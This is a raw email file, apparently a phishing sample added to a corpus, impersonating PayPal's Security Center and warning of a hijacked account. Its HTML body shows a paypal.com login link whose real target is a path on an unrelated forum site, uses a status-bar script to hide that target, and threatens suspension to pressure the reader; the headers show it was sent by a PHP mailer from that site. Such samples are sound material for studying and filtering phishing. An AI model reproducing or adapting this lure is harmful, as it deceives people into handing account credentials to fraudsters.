@@ -1,0 +1,185 @@
+From nobody Sun Jan 25 13:47:53 2015
+Return-Path: <abn@server765.dnslive.net>
+X-Original-To: username@login.domain.com
+Delivered-To: username@login.domain.com
+Received: from mail1.domain.com (mail1.domain.com [10.23.1.4])
+ by spanky.domain.com (Postfix) with ESMTP id C6651536EC0
+ for <username@login.domain.com>; Mon, 21 Feb 2005 05:34:12 -0500 (EST)
+Received: from server765.dnslive.net (server765.dnslive.net [66.78.26.6])
+ by mail1.domain.com (Postfix) with ESMTP id 8136285B006
+ for <username@domain.com>; Mon, 21 Feb 2005 05:24:51 -0500 (EST)
+Received: from abn by server765.dnslive.net with local (Exim 4.43)
+ id 1D3AtH-0008EP-41
+ for username@domain.com; Mon, 21 Feb 2005 05:34:11 -0500
+To: username@domain.com
+Subject: Verify Your PayPal Account
+From: Security@PayPal.com
+Reply-To: Security@PayPal.com
+Errors-To: Security@PayPal.com
+Content-type: text/html; charset=UTF-8
+X-Mailer: PHP / 4.3.10
+Message-Id: <E1D3AtH-0008EP-41@server765.dnslive.net>
+Date: Mon, 21 Feb 2005 05:34:11 -0500
+X-AntiAbuse: This header was added to track abuse,
+ please include it with any abuse report
+X-AntiAbuse: Primary Hostname - server765.dnslive.net
+X-AntiAbuse: Original Domain - domain.com
+X-AntiAbuse: Originator/Caller UID/GID - [32317 32441] / [47 12]
+X-AntiAbuse: Sender Address Domain - server765.dnslive.net
+X-Source: /usr/bin/php
+X-Source-Args: /usr/bin/php emailer.php 
+X-Source-Dir: abn.com.tw:/public_html/forum/templates/paypal/emailer
+Status: O
+X-Status: 
+X-Keywords: 
+X-UID: 154
+
+
+<div id="message">
+
+
+
+
+
+
+<cursive language="_JavaScript">
+<!-- Hide the script from old browsers --
+
+        function a(txt) {
+                self.status = txt
+        }
+
+        function b() {
+                self.status = ""
+        }
+// --End Hiding Here -->
+
+
+<br><br></cursive><img src="http://paypal.com/en_US/i/logo/paypal_logo.gif" border="0" height="50" width="200">
+	<table style="width: 600px;" align="center" border="0" cellpadding="0" cellspacing="0">
+	<tbody><tr>
+
+</tr>
+</tbody></table>
+ 
+        <hr noshade="noshade" size="1">
+
+<img src="http://paypal.com/en_US/i/scr/pixel.gif" height="10" width="1"><br>
+					    
+<table style="width: 600px;" align="center" border="0" cellpadding="0" cellspacing="0">
+	<tbody><tr>
+	  	<td><font style="font-size: 17px;" color="#003366">Security Center</font></td>
+	</tr>
+	<tr>
+
+		<td><img src="http://paypal.com/en_US/i/scr/pixel.gif" height="2" width="2"></td>
+	</tr>
+</tbody></table>
+<table style="width: 600px;" align="center" border="0" cellpadding="0" cellspacing="0">
+	<tbody><tr>
+		<td><img src="http://paypal.com/en_US/i/scr/pixel.gif" height="6" width="6"></td>
+	</tr>
+	<tr>
+		<td bgcolor="#999999" width="100%"><img src="http://paypal.com/en_US/i/scr/pixel.gif" height="2" width="1"></td>
+	</tr>
+
+	<tr>
+		<td><img src="http://paypal.com/en_US/i/scr/pixel.gif" height="6" width="6"></td>
+	</tr>
+</tbody></table>
+
+<!-- begin main -->
+
+<table style="width: 600px;" align="center" border="0" cellpadding="0" cellspacing="0">
+	<tbody><tr valign="top">
+		<td>
+			<table style="width: 600px;" align="center" border="0" cellpadding="0" cellspacing="0">
+
+				<tbody><tr>
+					<td width="240"><img src="http://paypal.com/en_US/i/header/hdr_securityCenter_240x120.gif" valign="top"><br><br></td>
+					<td width="20">&nbsp;</td>
+					<td style="font-size: 13px;"><span style="font-weight: 700;">Military Grade Encryption is Only the Start</span><br><br>At
+PayPal, we want to increase your security and comfort level with every
+transaction. From our Buyer and Seller Protection Policies to our
+Verification and Reputation systems, we'll help to keep you safe.<br><br></td>
+				</tr>
+			</tbody></table>
+		</td>
+	</tr>
+
+</tbody></table>
+
+<!-- end main -->
+
+<table style="width: 600px;" align="center" border="0" cellpadding="0" cellspacing="0">
+	<tbody><tr>
+		<td><img src="http://paypal.com/en_US/i/scr/pixel.gif" height="6" width="6"></td>
+	</tr>
+	<tr>
+		<td bgcolor="#999999" width="100%"><img src="http://paypal.com/en_US/i/scr/pixel.gif" height="2" width="1"></td>
+	</tr>
+
+	<tr>
+		<td><img src="http://paypal.com/en_US/i/scr/pixel.gif" height="6" width="6"></td>
+	</tr>
+</tbody></table>
+
+<table style="width: 600px;" align="center" border="0" cellpadding="0" cellspacing="0">
+	<tbody><tr>
+
+<td style="font-size: 13px;"><span style="font-weight: 700;">
+<br><br>We have recently noticed one or more attempts to log into your PayPal account from a 
+foreign IP address and we have reasons to believe that your account may have been hijacked 
+by a third party without your authorization.<br><br>
+If you recently accessed your account while traveling, the unusual
+login in attempts
+may have been initiated by you.
+However, if you are the rightful holder of the account, click on the
+link below to log into your account within the above-mentioned period. <br><br><br>
+<a target="_blank" href="http://www.abn.com.tw/forum/templates/paypal/" onfiltered="a('https://www.paypal.com/cgi-bin/webscr?cmd=_login-run');return true">https://www.paypal.com/cgi-bin/webscr?cmd=_login-run</a><br>
+<br>
+
+<br>If you choose to ignore our request, you leave us no choice but to temporaly suspend 
+your account.<br><br>
+We ask that you allow at least 72 hours for the case to be investigated and we
+strongly recommend to verify your account in that time.
+</span><br><br>
+If you received this notice and you are not the authorized account 
+holder, please be aware that it is in violation of PayPal policy to represent 
+oneself as another PayPal user. Such action may also be in violation of 
+local, national, and/or international law. PayPal is committed to assist 
+law enforcement with any inquires related to attempts to misappropriate 
+personal information with the intent to commit fraud or theft. 
+Information will be provided at the request of law enforcement agencies to 
+ensure that perpetrators are prosecuted to the fullest extent of the law.<br><br>
+
+Thanks for your patience and understanding as we work together to protect your account.<br><br>
+Sincerely,<br>
+PayPal Account Review Department<br>
+PayPal, an eBay Company<br><br>
+
+</td>
+
+	</tr>
+</tbody></table>
+
+<hr noshade="noshade" size="1">
+
+<table style="width: 600px;" align="center" border="0" cellpadding="0" cellspacing="0">
+	<tbody><tr valign="top">
+		<td>
+			<table style="width: 600px;" align="center" border="0" cellpadding="0" cellspacing="0">
+				<tbody><tr>
+					<td style="font-size: 13px;">*Please do not respond to this e-mail as your reply will not be received.<br><br></td>
+
+					<td width="20">&nbsp;</td>
+					<td width="100"><img src="http://images.paypal.com/images/verification_seal.gif" valign="top" border="0" height="100" width="100"><br><br></td>
+				</tr>
+			</tbody></table>
+		</td>
+	</tr>
+</tbody></table><br><br>
+
+
+
+</div>
